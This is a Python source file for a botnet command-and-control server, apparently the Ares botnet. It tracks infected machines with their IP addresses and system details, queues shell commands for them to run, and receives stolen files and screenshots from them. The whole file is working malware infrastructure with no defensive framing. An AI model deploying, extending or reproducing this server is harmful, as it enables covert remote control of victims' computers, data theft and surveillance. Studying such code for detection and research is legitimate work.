import cherrypy
import sqlite3
import time
import os
import re
import random
import string


UPLOAD_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)
pending_uploads = []


html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}


def html_escape(text):
    return "".join(html_escape_table.get(c,c) for c in text)


def validate_botid(candidate):
    return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None


def query_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    result = []
    for row in cursor.execute(sql, params):
        result.append(row)
    conn.close()
    return result


def exec_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    cursor.execute(sql, params)
    conn.commit()
    conn.close()


class Main(object):
    @cherrypy.expose
    def index(self):
        with open("Menu.html", "r") as f:
            html = f.read()
            return html


class CNC(object):
    @cherrypy.expose
    def index(self):
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        output = ""
        for bot in bot_list:
            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3],
                bot[0])
        with open("List.html", "r") as f:
            html = f.read()
            html = html.replace("{{bot_table}}", output)
            return html

    @cherrypy.expose
    def bot(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("Bot.html", "r") as f:
            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html


class API(object):
    @cherrypy.expose
    def pop(self, botid, sysinfo):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def report(self, botid, output):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))

    @cherrypy.expose
    def push(self, botid, cmd):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), html_escape(cmd), False, html_escape(botid)))
        if cmd.startswith("upload "):
            pending_uploads.append(cmd[len("upload "):])
        if cmd.startswith("screenshot"):
            pending_uploads.append("screenshot")

    @cherrypy.expose
    def stdout(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 10', (botid,))
        for entry in reversed(bot_output):
            output += "%s\n\n" % entry[2]
        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
        for entry in bot_queue:
            output += "> %s [PENDING...]\n\n" % entry[2]
        return output

    @cherrypy.expose
    def upload(self, botid, src, uploaded):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        up_dir = os.path.join(UPLOAD_DIR, botid)
        if not os.path.exists(up_dir):
            os.makedirs(up_dir)
        expected_file = src
        if expected_file not in pending_uploads and src.endswith(".zip"):
            expected_file = src.split(".zip")[0]
        if expected_file in pending_uploads:
            pending_uploads.remove(expected_file)
        elif "screenshot" in pending_uploads:
            pending_uploads.remove("screenshot")
        else:
            raise cherrypy.HTTPError(403)
        while os.path.exists(os.path.join(up_dir, src)):
            src = "_" + src
        save_path = os.path.join(up_dir, src)
        outfile = open(save_path, 'wb')
        while True:
            data = uploaded.file.read(8192)
            if not data:
                break
            outfile.write(data)
        outfile.close()
        up_url = "../uploads/" +  html_escape(botid) + "/" + html_escape(src)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>', html_escape(botid)))


def main():
    config = {'global': {'server.socket_host': '127.0.0.1',
                'server.socket_port': 8080,
                'environment': 'production',
                },
                '/': {  
                    'response.headers.server': "Ares",
                },
                '/static': {
                    'tools.staticdir.on': True,
                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
                },
                '/uploads': {
                    'tools.staticdir.on': True,
                    'tools.staticdir.dir':  UPLOAD_DIR
                },
               }
    app = Main()
    app.api = API()
    app.cnc = CNC()
    print "[*] Server started on %s:%s" % (config["global"]["server.socket_host"], config["global"]["server.socket_port"])
    cherrypy.quickstart(app, config=config)


if __name__ == "__main__":
    main()
